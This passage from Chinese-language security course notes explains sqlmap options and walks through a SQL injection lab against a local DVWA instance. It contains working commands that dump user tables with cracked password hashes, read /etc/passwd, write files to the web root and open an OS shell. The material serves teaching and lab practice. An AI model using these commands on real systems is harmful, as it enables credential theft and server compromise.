<ul class="org-ul">
<li>例如: python sqlmap.py -u "<a href="http://xxx/param1/value1*/param2/value2/">http://xxx/param1/value1*/param2/value2/</a>"</li>
<li>sqlmap将会测试value1的位置是否可注入。</li>
</ul>

<p>
<b>指定数据库服务器系统</b>
</p>
<ul class="org-ul">
<li>参数：&#x2013;os</li>
<li>默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。</li>
</ul>
</div>
</div>
<div id="outline-container-h:5bab0e28-8151-4b02-82c4-d091bc76397e" class="outline-5">
<h5 id="h:5bab0e28-8151-4b02-82c4-d091bc76397e">Detection：探测等级</h5>
<div class="outline-text-5" id="text-h:5bab0e28-8151-4b02-82c4-d091bc76397e">
<div class="org-src-container">
<pre class="src src-sh">--level=LEVEL &#25191;&#34892;&#27979;&#35797;&#30340;&#31561;&#32423;&#65288;1-5&#65292;&#40664;&#35748;&#20026;1&#65289;
--risk&#65306;&#65288;*&#24910;&#29992;&#27492;&#21442;&#25968;&#26377;&#39118;&#38505;&#65289;&#65292; &#20849;&#26377;&#22235;&#20010;&#39118;&#38505;&#31561;&#32423;&#65288;0-3&#65289;&#65292;&#40664;&#35748;&#26159;1&#20250;&#27979;&#35797;&#22823;&#37096;&#20998;&#30340;&#27979;&#35797;&#35821;&#21477;&#65292;
          2&#20250;&#22686;&#21152;&#22522;&#20110;&#20107;&#20214;&#30340;&#27979;&#35797;&#35821;&#21477;&#65292;3&#20250;&#22686;&#21152;OR&#35821;&#21477;&#30340;SQL&#27880;&#20837;&#27979;&#35797;&#12290;
</pre>
</div>

<p>
<b>探测等级</b>
</p>

<p>
参数：&#x2013;level
</p>
<ul class="org-ul">
<li>共有五个等级，默认为1，最大为5，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</li>
</ul>

<p>
这个参数不仅影响使用哪些payload，同时也会影响测试的注入点，GET和POST的数据都会测试：
</p>
<ul class="org-ul">
<li>HTTP Cookie 在level为2的时候就会测试，</li>
<li>HTTP User-Agent/Referer头 在level为3的时候就会测试。</li>
<li>HTTP Host 在 level 5时测试</li>
</ul>

<p>
总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。
</p>

<p>
<b>风险等级</b>
</p>

<p>
参数：&#x2013;risk
</p>

<p>
共有四个风险等级：
</p>
<ul class="org-ul">
<li>1默认，会测试大部分的测试语句</li>
<li>2会增加基于事件的测试语句</li>
<li>3会增加OR语句的SQL注入测试。注意在生产环境不推荐用，可能会删除数据或增加脏数据</li>
</ul>

<p>
在有些时候，例如在UPDATE/DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。
</p>

<p>
测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。
</p>
</div>
</div>
<div id="outline-container-h:41025bd1-6892-4fb4-a351-e91defd53d1c" class="outline-5">
<h5 id="h:41025bd1-6892-4fb4-a351-e91defd53d1c">Enumeration：枚举数据</h5>
<div class="outline-text-5" id="text-h:41025bd1-6892-4fb4-a351-e91defd53d1c">
<div class="org-src-container">
<pre class="src src-sh">-a, --all          <span style="color: #b22222;">#</span><span style="color: #b22222;">&#33719;&#21462;&#25152;&#26377;&#20449;&#24687;</span>
-b, --banner       <span style="color: #b22222;">#</span><span style="color: #b22222;">&#33719;&#21462;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;&#30340;&#26631;&#35782;</span>
--current-user     <span style="color: #b22222;">#</span><span style="color: #b22222;">&#33719;&#21462;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;&#24403;&#21069;&#29992;&#25143;</span>
--current-db       <span style="color: #b22222;">#</span><span style="color: #b22222;">&#33719;&#21462;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;&#24403;&#21069;&#25968;&#25454;&#24211;</span>
--hostname         <span style="color: #b22222;">#</span><span style="color: #b22222;">&#33719;&#21462;&#25968;&#25454;&#24211;&#26381;&#21153;&#22120;&#30340;&#20027;&#26426;&#21517;&#31216;</span>
--is-dba           <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26816;&#27979;DBMS&#24403;&#21069;&#29992;&#25143;&#26159;&#21542;DBA&#65288;&#25968;&#25454;&#24211;&#31649;&#29702;&#21592;&#65289;</span>
--users            <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26522;&#20030;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;&#29992;&#25143;</span>
--passwords        <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26522;&#20030;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;&#29992;&#25143;&#23494;&#30721;&#21704;&#24076;</span>
--privileges       <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26522;&#20030;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;&#29992;&#25143;&#30340;&#26435;&#38480;</span>
--roles            <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26522;&#20030;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;&#29992;&#25143;&#30340;&#35282;&#33394;</span>
--dbs              <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26522;&#20030;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;&#25968;&#25454;&#24211;</span>
--tables           <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26522;&#20030;&#30340;DBMS&#25968;&#25454;&#24211;&#20013;&#30340;&#34920;</span>
--columns          <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26522;&#20030;DBMS&#25968;&#25454;&#24211;&#34920;&#21015;</span>
--schema           <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26522;&#20030;&#25968;&#25454;&#24211;&#26550;&#26500;</span>
--count            <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26816;&#32034;&#34920;&#30340;&#39033;&#30446;&#25968;</span>
--dump             <span style="color: #b22222;">#</span><span style="color: #b22222;">&#36716;&#20648;&#25968;&#25454;&#24211;&#34920;&#39033;&#65292;&#21363;&#19979;&#36733;</span>
--dump-all         <span style="color: #b22222;">#</span><span style="color: #b22222;">&#36716;&#20648;&#25968;&#25454;&#24211;&#25152;&#26377;&#34920;&#39033;</span>
--search           <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25628;&#32034;&#21015;&#65288;S&#65289;&#65292;&#34920;&#65288;S&#65289;&#21644;/&#25110;&#25968;&#25454;&#24211;&#21517;&#31216;&#65288;S&#65289;</span>
--comments         <span style="color: #b22222;">#</span><span style="color: #b22222;">&#33719;&#21462;DBMS&#27880;&#37322;</span>
-D DB              <span style="color: #b22222;">#</span><span style="color: #b22222;">&#35201;&#36827;&#34892;&#26522;&#20030;&#30340;&#25351;&#23450;&#25968;&#25454;&#24211;&#21517;</span>
-T TBL             <span style="color: #b22222;">#</span><span style="color: #b22222;">DBMS&#25968;&#25454;&#24211;&#34920;&#26522;&#20030;</span>
-C COL             <span style="color: #b22222;">#</span><span style="color: #b22222;">DBMS&#25968;&#25454;&#24211;&#34920;&#21015;&#26522;&#20030;</span>
-X EXCLUDECOL DBMS <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25968;&#25454;&#24211;&#34920;&#19981;&#36827;&#34892;&#26522;&#20030;</span>
-U USER            <span style="color: #b22222;">#</span><span style="color: #b22222;">&#29992;&#26469;&#36827;&#34892;&#26522;&#20030;&#30340;&#25968;&#25454;&#24211;&#29992;&#25143;</span>
--exclude-sysdbs   <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26522;&#20030;&#34920;&#26102;&#25490;&#38500;&#31995;&#32479;&#25968;&#25454;&#24211;</span>
--pivot-column=P.. Pivot columnname
--where=DUMPWHERE Use WHEREcondition while table dumping
--start=LIMITSTART <span style="color: #b22222;">#</span><span style="color: #b22222;">&#33719;&#21462;&#31532;&#19968;&#20010;&#26597;&#35810;&#36755;&#20986;&#25968;&#25454;&#20301;&#32622;</span>
--stop=LIMITSTOP   <span style="color: #b22222;">#</span><span style="color: #b22222;">&#33719;&#21462;&#26368;&#21518;&#26597;&#35810;&#30340;&#36755;&#20986;&#25968;&#25454;</span>
--first=FIRSTCHAR  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#31532;&#19968;&#20010;&#26597;&#35810;&#36755;&#20986;&#23383;&#30340;&#23383;&#31526;&#33719;&#21462;</span>
--last=LASTCHAR    <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26368;&#21518;&#26597;&#35810;&#30340;&#36755;&#20986;&#23383;&#23383;&#31526;&#33719;&#21462;</span>
--sql-query=QUERY  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#35201;&#25191;&#34892;&#30340;SQL&#35821;&#21477;</span>
--sql-shell        <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25552;&#31034;&#20132;&#20114;&#24335;SQL&#30340;shell</span>
--sql-file=SQLFILE <span style="color: #b22222;">#</span><span style="color: #b22222;">&#35201;&#25191;&#34892;&#30340;SQL&#25991;&#20214;&#36820;</span>
</pre>
</div>

<p>
<b>标志</b>
</p>
<ul class="org-ul">
<li>参数：-b,&#x2013;banner</li>
<li>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version，这主要取决于是什么数据库。</li>
</ul>

<p>
<b>当前用户</b>
</p>
<ul class="org-ul">
<li>参数：&#x2013;current-user</li>
<li>在大多数据库中可以获取到管理数据的用户。</li>
</ul>

<p>
<b>当前数据库</b>
</p>
<ul class="org-ul">
<li>参数：&#x2013;current-db</li>
<li>还当前连接的数据库。</li>
</ul>

<p>
<b>当前用户是否为管理员</b>
</p>
<ul class="org-ul">
<li>参数：&#x2013;is-dba</li>
<li>判断当前的用户是否为管理员，是的话会返回True。</li>
</ul>

<p>
<b>列出数据库管理用户</b>
</p>
<ul class="org-ul">
<li>参数：&#x2013;users</li>
<li>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</li>
</ul>

<p>
<b>列出并破解数据库用户的hash</b>
</p>
<ul class="org-ul">
<li>参数：&#x2013;passwords</li>
<li>当前用户有权限读取包含用户密码的表的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">python sqlmap.py -u <span style="color: #8b2252;">"http://xxx/sqlmap/pgsql/students.php?id=1"</span> --passwords -v1
</pre>
</div>

<p>
<b>列出数据库管理员权限</b>
</p>
<ul class="org-ul">
<li>参数：&#x2013;privileges</li>
<li>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</li>
</ul>

<p>
<b>列出数据库管理员角色</b>
</p>

<ul class="org-ul">
<li>参数：&#x2013;roles</li>
<li>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。</li>
<li>仅适用于当前数据库是Oracle的时候。</li>
</ul>

<p>
<b>列出数据库系统的数据库</b>
</p>

<ul class="org-ul">
<li>参数：&#x2013;dbs</li>
<li>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</li>
</ul>

<p>
<b>列举数据库表</b>
</p>
<ul class="org-ul">
<li>参数：&#x2013;tables,&#x2013;exclude-sysdbs,-D</li>
<li>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</li>
<li>如果你不提供-D参数来指定一个数据库的时候，sqlmap会列出数据库所有库的所有表。</li>
</ul>

<p>
&#x2013;exclude-sysdbs参数是指可排除系统数据库。
需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。
</p>

<p>
<b>列举数据库表中的字段</b>
</p>

<ul class="org-ul">
<li>参数：&#x2013;columns,-C,-T,-D</li>
<li>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</li>
<li>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</li>
</ul>
</div>
</div>
<div id="outline-container-h:df4964d6-4b81-4b08-98e2-488435f6c7a2" class="outline-5">
<h5 id="h:df4964d6-4b81-4b08-98e2-488435f6c7a2">Brute force：爆破</h5>
<div class="outline-text-5" id="text-h:df4964d6-4b81-4b08-98e2-488435f6c7a2">
<div class="org-src-container">
<pre class="src src-sh">--common-tables    <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26816;&#26597;&#23384;&#22312;&#20849;&#21516;&#34920;</span>
--common-columns   <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26816;&#26597;&#23384;&#22312;&#20849;&#21516;&#21015;</span>
User-defined <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">injection</span>&#65288;&#29992;&#25143;&#33258;&#23450;&#20041;&#20989;&#25968;&#27880;&#20837;&#65289;&#65306;
--udf-inject       <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27880;&#20837;&#29992;&#25143;&#33258;&#23450;&#20041;&#20989;&#25968;</span>
--shared-lib=SHLIB <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20849;&#20139;&#24211;&#30340;&#26412;&#22320;&#36335;&#24452;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:3b2ea873-5f19-4540-9bf0-0504ab909977" class="outline-5">
<h5 id="h:3b2ea873-5f19-4540-9bf0-0504ab909977">File system access：访问文件系统</h5>
<div class="outline-text-5" id="text-h:3b2ea873-5f19-4540-9bf0-0504ab909977">
<div class="org-src-container">
<pre class="src src-sh">--file-read=RFILE &#20174;&#21518;&#31471;&#30340;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;&#35835;&#21462;&#25991;&#20214;
--file-write=WFILE &#19978;&#20256;&#25991;&#20214;&#21040;&#21518;&#31471;&#30340;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;
--file-dest=DFILE &#21518;&#31471;&#30340;&#25968;&#25454;&#24211;&#31649;&#29702;&#31995;&#32479;&#20889;&#20837;&#25991;&#20214;&#30340;&#32477;&#23545;&#36335;&#24452;
</pre>
</div>

<p>
<b>从数据库服务器中读取文件</b>
</p>

<ul class="org-ul">
<li>参数：&#x2013;file-read</li>
<li>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">python sqlmap.py -u <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span style="color: #8b2252;">"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;security=low"</span> -p id --file-read <span style="color: #8b2252;">"/etc/passwd"</span>
</pre>
</div>

<p>
<b>把文件上传到数据库服务器中</b>
</p>

<ul class="org-ul">
<li>参数：&#x2013;file-write,&#x2013;file-dest</li>
<li>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">python sqlmap.py -u <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span style="color: #8b2252;">"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;security=low"</span> -p id

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#26412;&#22320;&#25991;&#20214;/opt/test_code/user.txt &#19978;&#20256;&#21040;&#26381;&#21153;&#22120; /var/www/html/user.txt</span>
python sqlmap.py -u <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span style="color: #8b2252;">"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;security=low"</span> -p id --file-write=<span style="color: #8b2252;">"/opt/test_code/user.txt"</span> --filedest=<span style="color: #8b2252;">"/var/www/html/user.txt"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:e1c85b30-5cd4-4ac9-b24d-c61c22d36571" class="outline-5">
<h5 id="h:e1c85b30-5cd4-4ac9-b24d-c61c22d36571">Operating system access：访问操作系统</h5>
<div class="outline-text-5" id="text-h:e1c85b30-5cd4-4ac9-b24d-c61c22d36571">
<div class="org-src-container">
<pre class="src src-sh">--os-cmd=OSCMD &#25191;&#34892;&#25805;&#20316;&#31995;&#32479;&#21629;&#20196;
--os-shell &#20132;&#20114;&#24335;&#30340;&#25805;&#20316;&#31995;&#32479;&#30340;shell
--os-pwn &#33719;&#21462;&#19968;&#20010;OOB shell&#65292;meterpreter&#25110;VNC
--os-smbrelay &#19968;&#38190;&#33719;&#21462;&#19968;&#20010;OOB shell&#65292;meterpreter&#25110;VNC
--os-bof &#23384;&#20648;&#36807;&#31243;&#32531;&#20914;&#21306;&#28322;&#20986;&#21033;&#29992;
--priv-esc &#25968;&#25454;&#24211;&#36827;&#31243;&#29992;&#25143;&#26435;&#38480;&#25552;&#21319;
--msf-path=MSFPATH Metasploit Framework &#26412;&#22320;&#30340;&#23433;&#35013;&#36335;&#24452;
--tmp-path=TMPPATH &#36828;&#31243;&#20020;&#26102;&#25991;&#20214;&#30446;&#24405;&#30340;&#32477;&#23545;&#36335;&#24452;
</pre>
</div>


<p>
<b>获取整个表的数据</b>
</p>

<p>
参数：&#x2013;dump,-C,-T,-D,&#x2013;start,&#x2013;stop,&#x2013;first,&#x2013;last
</p>

<p>
如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。
</p>

<p>
使用-D,-T参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。
</p>

<div class="org-src-container">
<pre class="src src-sh">python sqlmap.py -u <span style="color: #8b2252;">"http://xxx/sqlmap/firebird/students.php?id=1"</span> --dump -T users --bash

<span style="color: #b22222;"># </span><span style="color: #b22222;">--batch &#19981;&#29992;&#20132;&#20114;&#24335;&#30830;&#35748;</span>
</pre>
</div>

<p>
可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。也可以用-dump跟-C获取指定的字段内容。
</p>

<p>
sqlmap为每个表生成了一个CSV文件。
</p>

<p>
范例：
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt; ./sqlmap.py -r 1.txt --dump -T users --batch
... ...
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21516;&#26102;&#25226;&#23494;&#30721;&#26126;&#25991;&#35299;&#26512;&#20986;&#26469;&#20102;</span>
[5 entries]
+---------+---------+--------------------------------------------------+-----------+---------------------------------------------+------------+---------------------+--------------+
| user_id | user    | avatar                                           | last_name | password                                    | first_name | last_login          | failed_login |
+---------+---------+--------------------------------------------------+-----------+---------------------------------------------+------------+---------------------+--------------+
| 1       | admin   | http://124.222.171.19/hackable/users/admin.jpg   | admin     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin      | 2023-05-31 02:50:54 | 0            |
| 2       | gordonb | http://124.222.171.19/hackable/users/gordonb.jpg | Brown     | e99a18c428cb38d5f260853678922e03 (abc123)   | Gordon     | 2023-05-31 02:50:54 | 0            |
| 3       | 1337    | http://124.222.171.19/hackable/users/1337.jpg    | Me        | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Hack       | 2023-05-31 02:50:54 | 0            |
| 4       | pablo   | http://124.222.171.19/hackable/users/pablo.jpg   | Picasso   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Pablo      | 2023-05-31 02:50:54 | 0            |
| 5       | smithy  | http://124.222.171.19/hackable/users/smithy.jpg  | Smith     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Bob        | 2023-05-31 02:50:54 | 0            |
+---------+---------+--------------------------------------------------+-----------+---------------------------------------------+------------+---------------------+--------------+
</pre>
</div>

<p>
如果你只想获取一段数据，可以使用&#x2013;start和&#x2013;stop参数，例如，你只想获取第一段数据可以使用&#x2013;stop 1，如果想获取第二段与第三段数据，使用参数 &#x2013;start 1 &#x2013;stop 3。
</p>

<p>
也可以用&#x2013;first与&#x2013;last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中第三个字符到第五个字符的内容，使用&#x2013;first 3 &#x2013;last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。
</p>

<p>
<b>获取所有数据库表的内容</b>
</p>

<p>
参数：&#x2013;dump-all,&#x2013;exclude-sysdbs
</p>

<p>
使用&#x2013;dump-all参数获取所有数据库表的内容，可同时加上&#x2013;exclude-sysdbs排除系统数据库，只获取用户数据库的表，即业务数据。
</p>

<p>
<b>搜索字段，表，数据库</b>
</p>

<p>
参数：&#x2013;search,-C,-T,-D
</p>

<p>
&#x2013;search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。
</p>

<p>
可以在以下三种情况下使用：
</p>
<div class="org-src-container">
<pre class="src src-sh">-C&#21518;&#36319;&#30528;&#29992;&#36887;&#21495;&#20998;&#21106;&#30340;&#21015;&#21517;&#65292;&#23558;&#20250;&#22312;&#25152;&#26377;&#25968;&#25454;&#24211;&#34920;&#20013;&#25628;&#32034;&#25351;&#23450;&#30340;&#21015;&#21517;&#12290;
-T&#21518;&#36319;&#30528;&#29992;&#36887;&#21495;&#20998;&#21106;&#30340;&#34920;&#21517;&#65292;&#23558;&#20250;&#22312;&#25152;&#26377;&#25968;&#25454;&#24211;&#20013;&#25628;&#32034;&#25351;&#23450;&#30340;&#34920;&#21517;
-D&#21518;&#36319;&#30528;&#29992;&#36887;&#21495;&#20998;&#21106;&#30340;&#24211;&#21517;&#65292;&#23558;&#20250;&#22312;&#25152;&#26377;&#25968;&#25454;&#24211;&#20013;&#25628;&#32034;&#25351;&#23450;&#30340;&#24211;&#21517;&#12290;
</pre>
</div>

<p>
<b>运行任意操作系统命令</b>
</p>

<p>
参数：&#x2013;os-cmd,&#x2013;os-shell
</p>
<div class="org-src-container">
<pre class="src src-sh">python sqlmap.py -u <span style="color: #8b2252;">"127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span style="color: #8b2252;">"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low"</span> -p id --os-cmd id --batch

python sqlmap.py -r 1.txt --os-shell --batch
</pre>
</div>

<p>
用&#x2013;os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。
</p>

<p>
<b>爬取网站URL</b>
</p>

<p>
参数：&#x2013;crawl
</p>

<p>
sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。此时的URL可以不带参数。
</p>

<p>
例子：
</p>

<div class="org-src-container">
<pre class="src src-sh">python sqlmap.py -u <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --batch --crawl=3
</pre>
</div>

<p>
<b>定义dump数据的格式</b>
</p>

<p>
参数：&#x2013;dump-format
</p>

<p>
输出的格式可定义为：CSV，HTML，SQLITE
</p>

<p>
<b>忽略在会话文件中存储的查询结果</b>
</p>

<p>
参数：&#x2013;fresh-queries
</p>

<p>
忽略session文件保存的查询缓存，重新查询。
</p>

<p>
<b>自定义输出的路径</b>
</p>

<ul class="org-ul">
<li>参数：&#x2013;output-dir</li>
<li>sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：&#x2013;output-dir=/tmp</li>
</ul>
</div>
</div>
<div id="outline-container-h:18407a7b-c7e7-4a4a-acff-6f44c3c5bc55" class="outline-5">
<h5 id="h:18407a7b-c7e7-4a4a-acff-6f44c3c5bc55">General 通用</h5>
<div class="outline-text-5" id="text-h:18407a7b-c7e7-4a4a-acff-6f44c3c5bc55">
<div class="org-src-container">
<pre class="src src-sh">--batch   <span style="color: #b22222;">#</span><span style="color: #b22222;">&#19981;&#38656;&#35201;&#20132;&#20114;&#65292;&#33258;&#21160;&#30830;&#35748; </span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:3d35f3ed-1d59-4298-a63f-a8a807e68d48" class="outline-4">
<h4 id="h:3d35f3ed-1d59-4298-a63f-a8a807e68d48">实际利用(dvwa)</h4>
<div class="outline-text-4" id="text-h:3d35f3ed-1d59-4298-a63f-a8a807e68d48">
<p>
当给sqlmap这么一个url的时候，它会：
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#21028;&#26029;&#21487;&#27880;&#20837;&#30340;&#21442;&#25968;
2&#12289;&#21028;&#26029;&#21487;&#20197;&#20351;&#29992;&#21738;&#31181;SQL&#27880;&#20837;&#25216;&#26415;&#26469;&#27880;&#20837;
3&#12289;&#35782;&#21035;&#20986;&#21738;&#31181;&#25968;&#25454;&#24211;
4&#12289;&#26681;&#25454;&#29992;&#25143;&#36873;&#25321;&#65292;&#35835;&#21462;&#21738;&#20123;&#25968;&#25454;
</pre>
</div>

<p>
如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数
</p>
<div class="org-src-container">
<pre class="src src-sh">0&#12289;&#21482;&#26174;&#31034;python&#38169;&#35823;&#20197;&#21450;&#20005;&#37325;&#30340;&#20449;&#24687;
1&#12289;&#21516;&#26102;&#26174;&#31034;&#22522;&#26412;&#20449;&#24687;&#21644;&#35686;&#21578;&#20449;&#24687;&#65288;&#40664;&#35748;&#65289;
2&#12289;&#21516;&#26102;&#26174;&#31034;debug&#20449;&#24687;
3&#12289;&#21516;&#26102;&#26174;&#31034;&#27880;&#20837;&#30340;payload
4&#12289;&#21516;&#26102;&#26174;&#31034;HTTP&#35831;&#27714;
5&#12289;&#21516;&#26102;&#26174;&#31034;HTTP&#21709;&#24212;&#22836;
6&#12289;&#21516;&#26102;&#26174;&#31034;HTTP&#21709;&#24212;&#39029;&#38754;
</pre>
</div>

<p>
如果你想看到sqlmap发送的测试payload最好的等级就是3。
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#27880;&#20837;&#28857;&#65292;&#22240;&#31995;&#32479;&#38656;&#35201;&#30331;&#24405;&#25152;&#20197;&#35201;&#21152;cookie</span>
python sqlmap.py -u <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span style="color: #8b2252;">"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;security=low"</span> -p id
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26816;&#27979;&#31449;&#28857;&#21253;&#21547;&#21738;&#20123;&#25968;&#25454;&#24211;</span>
python sqlmap.py -u <span style="color: #8b2252;">"http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span style="color: #8b2252;">"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;security=low"</span> -p id --dbs --batch
</pre>
</div>

<p>
技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“&#x2013;batch”命令来自动答复和判断
</p>

<p>
可以看到有4个数据库，我们选择dvwa数据库获取表名
</p>
<div class="org-src-container">
<pre class="src src-sh">sqlmap -u http://127.0.0.1/vulnerabilities/sqli/?<span style="color: #a0522d;">id</span>=1 -D dvwa --tables --batch
&#33719;&#21462;&#25351;&#23450;&#25968;&#25454;&#24211;&#20013;&#30340;&#34920;&#21517; -D&#21518;&#25509;&#25351;&#23450;&#30340;&#25968;&#25454;&#24211;&#21517;&#31216;
</pre>
</div>

<p>
可以看到，dvwa里面有两张表，分别是guestbook，users。选择users表获取表中的字段
</p>
<div class="org-src-container">
<pre class="src src-sh">sqlmap -u http://127.0.0.1/vulnerabilities/sqli/?<span style="color: #a0522d;">id</span>=1 -D dvwa -T users --columns --batch
</pre>
</div>

<p>
可以看到里面有password，直接获取我们想要的内容
</p>
<div class="org-src-container">
<pre class="src src-sh">sqlmap -u http://127.0.0.1/vulnerabilities/sqli/?<span style="color: #a0522d;">id</span>=1 -D dvwa -T users -C last_name,password --dump --batch

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25191;&#34892;&#32467;&#26524;</span>
Database: dvwa
Table: users
[5 entries]
+-----------+---------------------------------------------+
| last_name | password                                    |
+-----------+---------------------------------------------+
| admin     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| Brown     | e99a18c428cb38d5f260853678922e03 (abc123)   |
| Me        | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| Picasso   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| Smith     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+-----------+---------------------------------------------+
</pre>
</div>


<p>
重点总结：
</p>
<ol class="org-ol">
<li>SQL注入原理，手工SQL注入方式</li>
<li>SQL注入防御方法和原理</li>
<li>sqlmap使用方式</li>
</ol>

<p>
练习：
</p>
<ul class="org-ul">
<li>要求：零基础的人员能够看懂</li>
<li>SQL注入教程
<ul class="org-ul">
<li>攻击
<ul class="org-ul">
<li>如何识别sql注入</li>
<li>SQL注入分类</li>
<li>不同类别注入方法</li>
<li>不同类别的注入原理</li>
<li>使用的各种函数和原理</li>
</ul></li>
<li>防御
<ul class="org-ul">
<li>防御方法有几种</li>
<li>不同防御方法的原理和方式</li>
</ul></li>
</ul></li>
<li>sqlmap教程
<ul class="org-ul">
<li>sqlmap使用
<ul class="org-ul">
<li>各种参数的使用</li>
<li>使用场景</li>
<li>自身经验</li>
</ul></li>
</ul></li>
</ul>
</div>
</div>
</div>
</section>
<section id="outline-container-h:e1186713-9d13-411d-a0ed-91f29738d37e" class="outline-2">
<h2 id="h:e1186713-9d13-411d-a0ed-91f29738d37e">XSS 漏洞攻防</h2>
<div class="outline-text-2" id="text-h:e1186713-9d13-411d-a0ed-91f29738d37e">
<p>
主要内容：
</p>
<ul class="org-ul">
